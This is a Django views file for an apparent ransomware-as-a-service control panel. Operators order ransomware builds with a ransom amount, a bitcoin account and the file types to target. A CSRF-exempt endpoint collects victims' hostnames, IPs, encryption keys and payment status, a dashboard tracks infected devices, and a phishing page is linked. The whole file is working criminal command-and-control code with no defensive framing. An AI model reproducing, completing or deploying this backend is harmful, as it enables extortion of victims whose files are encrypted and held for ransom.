from django.shortcuts import render
from django.db.models import  Count
from django.contrib.auth.decorators import login_required
from django.views.decorators.csrf import csrf_exempt
from json import JSONEncoder
from django.http import JsonResponse
from .models import User , Devices , Ransomwares , RansomwaresAdd
from django.contrib import messages
from django.contrib.auth.decorators import login_required
from django.contrib.auth.forms import UserCreationForm,AuthenticationForm
from django.contrib.auth import logout as django_logout
from django.contrib.auth import authenticate, login as dj_login
from django.shortcuts import redirect



# Create your views here.


@login_required(login_url = "/login")
def ransomwares(request):
    if request.POST:
        this_user = request.user
        if request.POST['name'] and request.POST['amount'] and request.POST['account'] and request.POST['formats']:
            print(str(RansomwaresAdd.objects.filter(user=this_user)))
            if  str(RansomwaresAdd.objects.filter(user=this_user)) == '<QuerySet []>':
                new_Ransomwares = RansomwaresAdd(
                    user=request.user,
                    name=request.POST['name'],amount=request.POST['amount'],
                    bitcoinaccount=request.POST['account'],file_formats=request.POST['formats']
                )
                new_Ransomwares.save()
                messages.add_message(request, messages.INFO, 'Request sent To see the status, go to Settings.')
            else:
                messages.add_message(request, messages.INFO, 'You have an open request, please wait or check the settings !')    
        else:
            messages.add_message(request, messages.INFO, 'Please fill in all the fields.')


    this_user = request.user
    Device_inProcess = Devices.objects.filter(user=this_user,status='inProcess').all().count()
    Device_payments = Devices.objects.filter(user=this_user,status='payments').all().count()
    Device_successful = Devices.objects.filter(user=this_user,status='successful').all().count()
    Device_Unsuccessful = Devices.objects.filter(user=this_user,status='Unsuccessful').all().count()
    Device = Devices.objects.filter(user=this_user).order_by('-pk')
    if str(Ransomwares.objects.filter(user=this_user)) != '<QuerySet []>':
        Ransomwares_URL = Ransomwares.objects.filter(user=this_user)[0].url
    else:
        Ransomwares_URL = 'No Link Create Ransomware !'   

    context = {

        'Devices' : Device,
        'Device_inProcess' : Device_inProcess,
        'Device_payments' : Device_payments,
        'Device_successful' : Device_successful,
        'Device_unsuccessful' : Device_Unsuccessful,
        'Ransomwares_URL' :Ransomwares_URL,

    }
    return render(request,'Ransomwares.html',context)

@csrf_exempt
def Devices_q(request):
    if request.POST:
        print(request.POST['token'])
        this_user = Ransomwares.objects.filter(token=request.POST['token'])[0].user
        this_ransomwares = Ransomwares.objects.filter(user=this_user)[0]
        username_id = request.POST['username_id']
        hostname = request.POST['hostname']
        ip = request.POST['ip']
        key = request.POST['key']
        amount = this_ransomwares.amount
        status =  request.POST['status']
        new_Devices = Devices(
            user=this_user,
            ransomwares=this_ransomwares,
            username_id=username_id,
            hostname=hostname,
            ip = ip,
            key = key,
            amount = amount,
            status = status,
        )
        new_Devices.save()




        context = {'STATUS':'200'}

    else:
        context = {'STATUS':'401'}


    return JsonResponse(context, encoder=JSONEncoder)    


@login_required(login_url = "/login")
def fishing(request):
    return render(request,'Fishing.html')




def login(request):
    if request.POST:
        username = request.POST['username']
        password = request.POST['password']
        user = authenticate(request, username=username, password=password)
        if user is not None:
            dj_login(request, user)
            return redirect('app:ransomwares')
        else:
            messages.add_message(request, messages.INFO, 'Failed login !')
    
    return render(request,'login.html')


@csrf_exempt
@login_required(login_url = "/login")
def logout(request):
    django_logout(request=request)
    return redirect('app:login')        


def settings(request):
    if request.POST:
        if request.POST['csrfmiddlewaretoken']:
            print(request.POST['dal'])
            this_user = request.user
            RansomwaresAdd_all = RansomwaresAdd.objects.filter(user=this_user)
            Ransomwares_all = Ransomwares.objects.filter(user=this_user)
            RansomwaresAdd_all.delete()
            Ransomwares_all.delete()
            messages.add_message(request, messages.INFO, 'All deleted !')
    if str(RansomwaresAdd.objects.filter(user=request.user)) != '<QuerySet []>':      
        context = {
            'RansomwaresAdd' : RansomwaresAdd.objects.filter(user=request.user),
        }    
        return render(request,'settings.html',context)
    return render(request,'settings.html')    